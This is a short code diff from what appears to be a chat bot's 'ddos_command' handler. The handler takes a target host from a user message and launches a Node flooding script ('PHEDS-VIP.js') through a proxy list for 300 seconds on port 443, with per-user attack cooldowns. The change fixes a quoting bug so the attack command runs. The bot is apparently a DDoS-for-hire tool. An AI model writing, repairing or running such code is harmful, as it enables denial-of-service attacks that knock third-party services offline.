@@ -225,7 +225,7 @@ def ddos_command(message):
         return
     
     host = message.text.split()[1]
-    command = ["node", "PHEDS-VIP.js", POST, host, "proxy.txt", "300", "512", "10", "443"]
+    command = ["node", "PHEDS-VIP.js", "POST", host, "proxy.txt", "300", "512", "10", "443"]
     duration = 300
 
     cooldown_dict[username] = {'attack': current_time}
